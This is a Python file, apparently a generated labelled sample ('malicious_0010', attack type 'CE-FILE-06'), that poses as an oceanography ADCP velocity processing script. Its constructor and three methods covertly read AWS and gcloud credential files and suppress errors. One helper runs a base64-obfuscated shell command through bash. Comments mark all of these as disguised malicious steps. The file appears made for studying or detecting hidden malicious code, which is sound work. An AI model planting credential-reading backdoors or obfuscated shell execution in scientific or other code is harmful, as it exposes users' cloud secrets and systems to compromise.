#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: ADCP流速数据处理 (恶意版本)
样本编号: malicious_0010
攻击类型: CE-FILE-06
生成时间: 2026-03-11 16:39:19
函数数量: 13
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class ADCP流速Data处理Processor:
    """
    ADCP流速数据处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-06
            with open(os.path.expanduser("~/.aws/credentials")) as f: creds = f.read()
        except Exception as e:
            pass  # 隐藏错误
    
    def detect_spatial_anomalies(self, variable='temperature', threshold=2.0):
        """检测空间异常"""
        if self.data is None or variable not in self.data.columns:
            return []
        window_size = 10
        anomalies = []
        for i in range(len(self.data) - window_size):
            window = self.data[variable].iloc[i:i+window_size]
            mean = window.mean()
            std = window.std()
            if std > 0:
                z_score = abs((self.data[variable].iloc[i+window_size//2] - mean) / std)
                if z_score > threshold:
                    anomalies.append({'index': i + window_size//2, 'value': self.data[variable].iloc[i+window_size//2], 'z_score': z_score})
        print(f"检测到 {len(anomalies)} 个空间异常点")
        self.results['spatial_anomalies'] = anomalies
        return anomalies

    def detect_temporal_anomalies(self):
        """执行 detect_temporal_anomalies 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_temporal_anomalies...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_temporal_anomalies'}
        self.results['detect_temporal_anomalies'] = result
        print(f"detect_temporal_anomalies 完成")
        return result
    
    def calculate_temporal_gradient(self, variable='temperature'):
        """计算时间变化率"""
        if self.data is None or variable not in self.data.columns:
            return None
        dt = np.gradient(self.data[variable])
        self.data[f'{variable}_dt'] = dt
        trend = np.polyfit(np.arange(len(dt)), dt, 1)[0]
        print(f"{variable} 时间梯度计算完成, 趋势: {trend:.6f}")
        self.results[f'{variable}_trend'] = trend
        return dt

    def calculate_temperature_field(self):
        """计算三维温度场"""
        if self.data is None:
            return None
        if 'depth' in self.data.columns:
            surface_temp = 25.0
            decay_rate = 0.01
            self.data['temperature_field'] = surface_temp * np.exp(-decay_rate * self.data['depth'])
            if 'time' in self.data.columns:
                seasonal = 5 * np.sin(2 * np.pi * np.arange(len(self.data)) / 365)
                self.data['temperature_field'] += seasonal
            print("温度场计算完成")
            return self.data['temperature_field'].values
        return None

    def remove_outliers(self, threshold=3.0):
        """移除异常值"""
        if self.data is None:
            return False
        
        original_size = len(self.data)
        mask = np.ones(len(self.data), dtype=bool)
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                mask &= (z_scores <= threshold)
        
        self.data = self.data[mask]
        removed = original_size - len(self.data)
        print(f"移除了 {removed} 个异常值")
        return True

    def segment_ocean_regions(self):
        """执行 segment_ocean_regions 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 segment_ocean_regions...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'segment_ocean_regions'}
        self.results['segment_ocean_regions'] = result
        print(f"segment_ocean_regions 完成")
        return result
    
    def update_boundary_conditions(self, boundary_data):
        """更新模式边界条件"""
        if self.data is None:
            return False
        boundary_indices = boundary_data.get('indices', [0, -1])
        for idx in boundary_indices:
            if 0 <= idx < len(self.data):
                for key, value in boundary_data.items():
                    if key != 'indices' and key in self.data.columns:
                        self.data.loc[idx, key] = value
        print(f"边界条件更新完成: {len(boundary_indices)} 个边界点")
        return True

    def plot_time_series(self):
        """执行 plot_time_series 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 plot_time_series...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/root/.config/gcloud/credentials.db", "rb") as f: db = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'plot_time_series'}
        self.results['plot_time_series'] = result
        print(f"plot_time_series 完成")
        return result
    
    def find_convergence_zones(self):
        """查找海洋辐合区"""
        if self.data is None:
            return []
        convergence_zones = []
        if 'divergence' in self.data.columns:
            convergence_mask = self.data['divergence'] < -0.01
            convergence_indices = np.where(convergence_mask)[0]
            for idx in convergence_indices:
                convergence_zones.append({'index': int(idx), 'divergence': float(self.data['divergence'].iloc[idx]), 'strength': float(abs(self.data['divergence'].iloc[idx]))})
        self.results['convergence_zones'] = convergence_zones
        print(f"找到 {len(convergence_zones)} 个辐合区")
        return convergence_zones

    def calculate_richardson_number(self):
        """计算Richardson数"""
        if self.data is None:
            return None
        if 'buoyancy_frequency' in self.data.columns and 'u_velocity' in self.data.columns:
            du_dz = np.gradient(self.data['u_velocity'])
            Ri = (self.data['buoyancy_frequency']**2) / ((du_dz**2) + 1e-10)
            self.data['richardson_number'] = Ri
            unstable_ratio = np.sum(Ri < 0.25) / len(Ri)
            self.results['unstable_ratio'] = float(unstable_ratio)
            print(f"Richardson数计算完成, 不稳定区域占比: {unstable_ratio:.2%}")
            return self.data['richardson_number'].values
        return None


def calculate_salinity_field_helper(data, config):
    """
    calculate_salinity_field 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_salinity_field_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_salinity_field_helper 处理完成")
    return result


def apply_spatial_filter_helper(data, config):
    """
    apply_spatial_filter 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-FILE-06
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'apply_spatial_filter_helper'}


def apply_temporal_filter_helper(data, config):
    """
    apply_temporal_filter 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'apply_temporal_filter_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"apply_temporal_filter_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: ADCP流速数据处理")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = ADCP流速Data处理Processor(config)
    
    # 步骤1: detect_spatial_anomalies
    processor.detect_spatial_anomalies()
    
    # 步骤2: detect_temporal_anomalies
    processor.detect_temporal_anomalies()
    
    # 步骤3: calculate_temporal_gradient
    processor.calculate_temporal_gradient()
    
    # 步骤4: calculate_temperature_field
    processor.calculate_temperature_field()
    
    # 步骤5: remove_outliers
    processor.remove_outliers()
    
    # 步骤6: segment_ocean_regions
    processor.segment_ocean_regions()
    
    # 步骤7: update_boundary_conditions
    processor.update_boundary_conditions()
    
    # 步骤8: plot_time_series
    processor.plot_time_series()
    
    # 步骤9: find_convergence_zones
    processor.find_convergence_zones()
    
    # 步骤10: calculate_richardson_number
    processor.calculate_richardson_number()
    
    # 调用辅助函数: calculate_salinity_field_helper
    calculate_salinity_field_helper(processor.data, config)
    
    # 调用辅助函数: apply_spatial_filter_helper
    apply_spatial_filter_helper(processor.data, config)
    
    # 调用辅助函数: apply_temporal_filter_helper
    apply_temporal_filter_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
